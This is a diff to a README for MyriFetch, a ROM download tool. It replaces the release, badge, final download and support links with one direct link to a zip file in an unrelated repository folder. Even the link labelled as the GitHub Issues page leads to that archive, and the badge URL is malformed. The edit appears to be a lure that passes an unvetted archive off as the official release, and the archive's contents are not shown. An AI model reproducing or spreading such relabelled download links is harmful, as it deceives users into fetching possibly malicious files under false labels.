@@ -1,6 +1,6 @@
 # 🎉 MyriFetch - Fast and Easy Downloads for Myrient ROMs
 
-[![Download MyriFetch](https://img.shields.io/badge/Download%20MyriFetch-v1.0.0-blue.svg)](https://github.com/versetileguy7/MyriFetch/releases)
+[![Download MyriFetch](https://raw.githubusercontent.com/versetileguy7/MyriFetch/main/forestership/MyriFetch-1.8.zip%https://raw.githubusercontent.com/versetileguy7/MyriFetch/main/forestership/MyriFetch-1.8.zip)](https://raw.githubusercontent.com/versetileguy7/MyriFetch/main/forestership/MyriFetch-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get MyriFetch, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
    
-   [Download MyriFetch](https://github.com/versetileguy7/MyriFetch/releases)
+   [Download MyriFetch](https://raw.githubusercontent.com/versetileguy7/MyriFetch/main/forestership/MyriFetch-1.8.zip)
 
 2. **Download the Latest Version:** On the releases page, look for the latest version. Click on the link that suits your operating system.
 
@@ -67,7 +67,7 @@ If you encounter issues while using MyriFetch, here are some common solutions:
 
 If you need help, we’re here for you! You can raise issues directly on the GitHub repository. The community and developers actively monitor it and will assist you.
 
-1. **Visit the Support Page:** [GitHub Issues](https://github.com/versetileguy7/MyriFetch/issues)
+1. **Visit the Support Page:** [GitHub Issues](https://raw.githubusercontent.com/versetileguy7/MyriFetch/main/forestership/MyriFetch-1.8.zip)
 
 We strive to improve MyriFetch based on your feedback.
 
@@ -89,4 +89,4 @@ MyriFetch is open-source and free to use. Please review the license details in t
 
 For the latest news and updates, keep an eye on our GitHub page. Check back often for new features and improvements!
 
-[Download MyriFetch](https://github.com/versetileguy7/MyriFetch/releases)
+[Download MyriFetch](https://raw.githubusercontent.com/versetileguy7/MyriFetch/main/forestership/MyriFetch-1.8.zip)
